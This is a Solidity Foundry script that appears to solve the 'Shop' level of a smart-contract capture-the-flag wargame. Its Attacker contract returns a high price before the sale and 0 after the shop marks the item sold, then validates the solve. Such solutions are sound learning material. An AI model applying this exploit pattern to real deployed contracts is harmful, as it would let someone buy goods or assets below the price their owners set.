// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Shop, Buyer} from "../src/21-Shop.sol";
import {ShopFactory} from "../src/ShopFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract ShopSolution is Script {
    Shop public shopLevel;
    address payable instanceAddress = payable(0x52ec26573b0208a4704310A76c0b14A97Dfb0dd2);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        shopLevel = Shop(instanceAddress);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker(shopLevel);
        attacker.attack();
        vm.stopBroadcast();

        validate();
    }

    function validate() internal {
        bool isValidated = new ShopFactory().validateInstance(instanceAddress, publicKey);
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attacker is Buyer {
    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) return 0;
        else return 100;
    }
}
